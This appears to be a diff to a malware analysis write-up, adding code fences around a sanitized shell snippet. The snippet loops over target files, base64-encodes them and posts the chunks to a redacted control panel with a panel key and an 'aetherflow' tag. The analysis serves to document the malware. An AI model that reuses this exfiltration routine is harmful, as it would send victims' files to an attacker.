@@ -71,6 +71,7 @@ Base64 encoding of file contents
 
 A sanitized representation of the relevant logic looked like:
 
+```
 PANEL="[REDACTED]"
 KEY="[REDACTED]"
 
@@ -90,3 +91,5 @@ for f in "${TARGETS[@]}"; do
         -H "X-Panel-Key: [REDACTED]" \
         -d "chunk=${b64}&fname=${f}&tag=aetherflow"
 done
+
+```
